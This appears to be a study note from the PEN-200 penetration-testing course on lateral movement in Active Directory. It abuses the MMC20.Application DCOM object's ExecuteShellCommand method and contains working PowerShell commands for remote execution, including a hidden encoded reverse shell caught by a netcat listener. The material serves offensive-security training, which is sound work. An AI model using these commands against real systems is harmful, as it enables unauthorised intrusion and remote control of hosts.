# 24.1.6 — DCOM

- Module: PEN-200 · 24. Lateral Movement in Active Directory
- Source: portal.offsec.com · module `lateral-movement-in-active-directory-47888` (§24.1.6)
- Code blocks: 3

> Abuse the **MMC20.Application** DCOM object's `ExecuteShellCommand` method for remote execution.
> DCOM is RPC over **TCP 135**; calling it requires **local admin** on the target. Output omitted.

## Instantiate the remote MMC object (elevated PowerShell)

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{{TARGET_IP}}"))
```

## Execute a command (Command, Directory, Parameters, WindowState)

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

> Runs in **session 0**; verify on the target with `tasklist | findstr "calc"`.

## Full reverse shell (reuse the base64 payload from [[24-wmi-and-winrm]])

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")
```

> Start `nc -lnvp {{LPORT}}` on Kali first.
